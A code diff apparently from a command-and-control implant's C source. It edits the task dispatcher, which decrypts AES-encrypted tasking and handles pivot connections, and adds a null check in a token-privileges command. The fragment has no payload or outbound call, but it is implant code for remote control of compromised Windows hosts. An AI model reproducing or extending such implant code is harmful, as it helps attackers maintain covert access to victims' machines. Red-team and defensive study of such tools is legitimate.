@@ -47,7 +47,6 @@ VOID CommandDispatcher( VOID )
     LPVOID   TaskBuffer     = NULL;
     UINT32   TaskBufferSize = 0;
     UINT32   CommandID      = 0;
-    BOOL     PackageFirst   = TRUE;
     BOOL     FoundCommand   = FALSE;
 
     PRINTF( "Session ID => %x\n", Instance->Session.DemonID );
@@ -79,11 +78,6 @@ VOID CommandDispatcher( VOID )
                     {
                         ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
                         ParserDecrypt( &TaskParser, Instance->Config.AES.Key, Instance->Config.AES.IV );
-
-                        if ( ! PackageFirst )
-                            ParserGetInt32( &TaskParser );
-                        else
-                            PackageFirst = FALSE;
                     }
 
                     FoundCommand = FALSE;
@@ -117,7 +111,6 @@ VOID CommandDispatcher( VOID )
             break;
 #endif
         }
-        PackageFirst = TRUE;
 
         /* === End routine checks === */
         // Check if we have something in our Pivots connection and sends back the output from the pipes
@@ -1317,7 +1310,6 @@ VOID CommandToken( PPARSER Parser )
             DWORD             Length      = 0;
             HANDLE            TokenHandle = NULL;
             BOOL              ListPrivs   = ParserGetInt32( Parser );
-            DWORD             UserSize    = 0;
 
             PackageAddInt32( Package, ListPrivs );
 
@@ -1350,9 +1342,12 @@ VOID CommandToken( PPARSER Parser )
                 PUTS( "Privs::Get" )
             }
 
-            MemSet( TokenPrivs, 0, sizeof( TOKEN_PRIVILEGES ) );
-            Instance->Win32.LocalFree( TokenPrivs );
-            TokenPrivs = NULL;
+            if ( TokenPrivs )
+            {
+                MemSet( TokenPrivs, 0, sizeof( TOKEN_PRIVILEGES ) );
+                Instance->Win32.LocalFree( TokenPrivs );
+                TokenPrivs = NULL;
+            }
 
             break;
         }
